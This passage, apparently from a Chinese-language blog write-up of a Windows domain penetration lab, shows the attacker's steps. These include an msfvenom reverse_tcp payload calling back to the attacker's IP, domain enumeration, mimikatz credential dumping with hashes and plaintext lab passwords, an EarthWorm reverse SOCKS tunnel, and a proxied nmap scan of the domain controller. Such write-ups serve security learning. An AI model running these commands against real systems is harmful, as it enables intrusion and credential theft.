src="https://pic.imgdb.cn/item/657524c8c458853aef412cdc.jpg"></a></p><p>åå¼¹æˆåŠŸã€‚</p><p>æ¥ä¸‹æ¥åˆ©ç”¨metasploitåˆ¶ä½œä¸€ä¸ªexeï¼Œåœ¨é¶æœºä¸­ä¸‹è½½ä¸‹æ¥ç„¶åæ‰§è¡Œï¼ŒæŠŠmeterpreteråå¼¹å‡ºæ¥:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.135.128 LPORT=1236 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/657524d9c458853aef416d3b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524d9c458853aef416d3b.jpg"></a></p><p>æ¥ä¸‹æ¥msfç›‘å¬ï¼Œåœ¨æ‹¿åˆ°çš„shellä¸­æ‰§è¡Œä¸‹è½½çš„æœ¨é©¬æ–‡ä»¶ï¼Œæ‹¿åˆ°meterpreterï¼š</p><p><a href="https://pic.imgdb.cn/item/657524e7c458853aef419ea3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524e7c458853aef419ea3.jpg"></a></p><h2 id="å†…ç½‘ä¿¡æ¯æ”¶é›†ï¼š"><a href="#å†…ç½‘ä¿¡æ¯æ”¶é›†ï¼š" class="headerlink" title="å†…ç½‘ä¿¡æ¯æ”¶é›†ï¼š"></a>å†…ç½‘ä¿¡æ¯æ”¶é›†ï¼š</h2><p>åœ¨meterpreteræ‰§è¡Œgetsystemå³å¯æ‹¿åˆ°systemæƒé™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">net view                 # æŸ¥çœ‹å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºå</span><br><span class="line">net config Workstation   # æŸ¥çœ‹è®¡ç®—æœºåã€å…¨åã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€åŸŸã€ç™»å½•åŸŸ</span><br><span class="line">net user                 # æŸ¥çœ‹æœ¬æœºç”¨æˆ·åˆ—è¡¨</span><br><span class="line">net user /domain         # æŸ¥çœ‹åŸŸç”¨æˆ·</span><br><span class="line">net localgroup administrators # æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆé€šå¸¸ä¼šæœ‰åŸŸç”¨æˆ·ï¼‰</span><br><span class="line">net view /domain         # æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ</span><br><span class="line">net user ç”¨æˆ·å /domain   # è·å–æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯</span><br><span class="line">net group /domain        # æŸ¥çœ‹åŸŸé‡Œé¢çš„å·¥ä½œç»„ï¼ŒæŸ¥çœ‹æŠŠç”¨æˆ·åˆ†äº†å¤šå°‘ç»„ï¼ˆåªèƒ½åœ¨åŸŸæ§ä¸Šæ“ä½œï¼‰</span><br><span class="line">net time /domain    #åˆ¤æ–­ä¸»åŸŸï¼Œä¸»åŸŸæœåŠ¡å™¨ä¸€èˆ¬åšæ—¶é—´æœåŠ¡å™¨</span><br><span class="line">net group ç»„å /domain    # æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„</span><br><span class="line">net group &quot;domain admins&quot; /domain  # æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„åå­—</span><br><span class="line">net group &quot;domain computers&quot; /domain  # æŸ¥çœ‹åŸŸä¸­çš„å…¶ä»–ä¸»æœºå</span><br><span class="line">net group &quot;domain controllers&quot; /domain  # æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ä¸»æœºåï¼ˆå¯èƒ½æœ‰å¤šå°ï¼‰</span><br><span class="line">ipconfig /all #æŸ¥è¯¢æœ¬æœºIPæ®µï¼Œæ‰€åœ¨åŸŸç­‰</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œipconfig &#x2F;allå¯ä»¥å‘ç°WebæœåŠ¡å™¨çš„å†…ç½‘IPä¸º192.168.138.136ï¼Œå¹¶ä¸”DNS serverä¸º192.168.138.138ï¼š</p><p><a href="https://pic.imgdb.cn/item/657524f6c458853aef41d0d5.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524f6c458853aef41d0d5.jpg"></a></p><p>IPä¸º192.168.138.138çš„è¿™å°æœºå™¨åº”è¯¥å°±æ˜¯DCäº†ã€‚æ ¹æ®ipconfig &#x2F;allè¿”å›çš„å†…å®¹ä¹Ÿå¯ä»¥å¾—çŸ¥å½“å‰æ‰€åœ¨åŸŸä¸ºsun.comã€‚å¯ä»¥åˆ¤æ–­å‡ºæˆ‘ä»¬æœ€å¼€å§‹æ‹¿åˆ°çš„shellçš„ç”¨æˆ·å°±æ˜¯åŸŸç®¡ï¼š</p><p><a href="https://pic.imgdb.cn/item/65752502c458853aef41f353.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752502c458853aef41f353.jpg"></a></p><p>åŸŸä¸­çš„ç”¨æˆ·å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/6575250dc458853aef422191.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575250dc458853aef422191.jpg"></a></p><p>å†…ç½‘ä¸»æœºå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/65752519c458853aef424918.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752519c458853aef424918.jpg"></a></p><p>æŸ¥çœ‹æœ‰å¤šå°‘åŸŸï¼š</p><p><a href="https://pic.imgdb.cn/item/65752524c458853aef426feb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752524c458853aef426feb.jpg"></a></p><p>ç”±äºmsfçš„mimikatzä¸€ç›´ä¸å¥½ç”¨ï¼Œæˆ‘ä»¬è‡ªå·±ä¸Šä¼ ä¸€ä¸ªï¼Œç„¶åæ‹¿ä¸€ä¸‹å¯†ç ï¼š</p><p><a href="https://pic.imgdb.cn/item/6575252fc458853aef429997.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575252fc458853aef429997.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/6575253ac458853aef42bf12.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575253ac458853aef42bf12.jpg"></a></p><p>æ‹¿ä¸€ä¸‹ç³»ç»Ÿå¯†ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug#æƒé™æå‡</span><br><span class="line">sekurlsa::logonPasswords#æ˜æ–‡æŠ“å–</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::logonPasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 1372017 (00000000:0014ef71)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2022/11/8 13:10:01</span><br><span class="line">SID               : S-1-5-21-3388020223-1982701712-4030140183-500</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * LM       : c8c42d085b5e3da2e9260223765451f1</span><br><span class="line"> * NTLM     : e8bea972b3549868cecd667a64a6ac46</span><br><span class="line"> * SHA1     : 3688af445e35efd8a4d4e0a9eb90b754a2f3a4ee</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : dc123.com</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : dc123.com</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : SUN.COM</span><br><span class="line"> * Password : dc123.com</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 578158 (00000000:0008d26e)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : leo</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : DC</span><br><span class="line">Logon Time        : 2022/11/8 13:06:13</span><br><span class="line">SID               : S-1-5-21-3388020223-1982701712-4030140183-1110</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : leo</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * LM       : b73a13e9b7832a35aad3b435b51404ee</span><br><span class="line"> * NTLM     : afffeba176210fad4628f0524bfe1942</span><br><span class="line"> * SHA1     : fa83a92197d9896cb41463b7a917528b4009c650</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : leo</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : 123.com</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : leo</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : 123.com</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : leo</span><br><span class="line"> * Domain   : SUN.COM</span><br><span class="line"> * Password : 123.com</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN7$</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN7$</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * NTLM     : dc1cbe1583c92a3740cfcd97e8f0a377</span><br><span class="line"> * SHA1     : 9275a3ad29e3f533b9a46b981dd635b6adc76169</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN7$</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win7$</span><br><span class="line"> * Domain   : SUN.COM</span><br><span class="line"> * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 50586 (00000000:0000c59a)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN7$</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * NTLM     : dc1cbe1583c92a3740cfcd97e8f0a377</span><br><span class="line"> * SHA1     : 9275a3ad29e3f533b9a46b981dd635b6adc76169</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN7$</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN7$</span><br><span class="line"> * Domain   : SUN</span><br><span class="line"> * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win7$</span><br><span class="line"> * Domain   : SUN.COM</span><br><span class="line"> * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br></pre></td></tr></table></figure><p>åŸŸç®¡çš„è´¦å·åŠå¯†ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">dc123.com</span><br></pre></td></tr></table></figure><p>åŸŸç”¨æˆ·leoçš„è´¦å·åŠå¯†ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leo</span><br><span class="line">123.com</span><br></pre></td></tr></table></figure><h2 id="è·¯ç”±è½¬å‘åŠéšè—é€šä¿¡éš§é“"><a href="#è·¯ç”±è½¬å‘åŠéšè—é€šä¿¡éš§é“" class="headerlink" title="è·¯ç”±è½¬å‘åŠéšè—é€šä¿¡éš§é“"></a>è·¯ç”±è½¬å‘åŠéšè—é€šä¿¡éš§é“</h2><p><a href="https://pic.imgdb.cn/item/65752552c458853aef43082d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752552c458853aef43082d.jpg"></a></p><p>æ¥ä¸‹æ¥å°è¯•åˆ©ç”¨EarthWarmæ¥æ­å»ºä¸€ä¸ªéšè—é€šä¿¡éš§é“ï¼Œé¦–å…ˆä¸ºWin7ä¸Šä¼ ä¸€ä¸ªew_for_Win.exeï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ­å»ºäº†ï¼š</p><p><a href="https://pic.imgdb.cn/item/65752561c458853aef433981.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752561c458853aef433981.jpg"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1238 -e 1237(æ”»å‡»æœºæ‰§è¡Œ)</span><br><span class="line">ew_for_Win.exe -s rssocks -d 192.168.135.128 -e 1237(é¶æœºæ‰§è¡Œ)</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ­å»ºï¼š</p><p><a href="https://pic.imgdb.cn/item/6575256cc458853aef43659f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575256cc458853aef43659f.jpg"></a></p><p>æˆ‘ä»¬ä¿®æ”¹proxychains4.confæ·»åŠ å¦‚ä¸‹ä»£ç†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1238</span><br></pre></td></tr></table></figure><p>åŒæ—¶ä¸è¦å¿˜è®°æ³¨é‡Šæ‰proxy_dnsã€‚</p><p>æ¥ä¸‹æ¥åˆ©ç”¨proxychains4æ¥é€šè¿‡æ·»åŠ çš„ä»£ç†åˆ©ç”¨nmapæ‰«æä¸€ä¸‹192.168.138.138è¿™å°æœºå­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sS -sV -sC -A -p- --min-rate 5000 192.168.138.138</span><br><span class="line">Nmap scan report for 192.168.138.138</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">Not shown: 65516 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">25/tcp    open  tcpwrapped</span><br><span class="line">|_smtp-commands: Couldn&#x27;t establish connection on port 25</span><br><span class="line">53/tcp    open  domain       Microsoft DNS 6.1.7600 (1DB04001) (Windows Server 2008 R2)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7600 (1DB04001)</span><br><span class="line">110/tcp   open  tcpwrapped</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: sun.com, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2008 HPC Edition 7600 microsoft-ds (workgroup: SUN)</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: sun.com, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49160/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49168/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49173/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49226/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows XP|7|2012</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012</span><br><span class="line">OS details: Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2h39m55s, deviation: 4h36m58s, median: -1s</span><br><span class="line">|_nbstat: NetBIOS name: DC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:92:68:89 (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2008 HPC Edition 7600 (Windows Server 2008 HPC Edition 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::-</span><br><span class="line">|   Computer name: DC</span><br><span class="line">|   NetBIOS computer name: DC\x00</span><br><span class="line">|   Domain name: sun.com</span><br><span class="line">|   Forest name: sun.com</span><br><span class="line">|   FQDN: DC.sun.com</span><br><span class="line">|_  System time: 2022-11-08T01:37:00+08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-11-07T17:37:00</span><br><span class="line">|_  start_date: 2022-11-07T16:39:34</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 25/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   3.57 ms 192.168.135.2</span><br><span class="line">2   3.58 ms 192.168.138.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 277.66 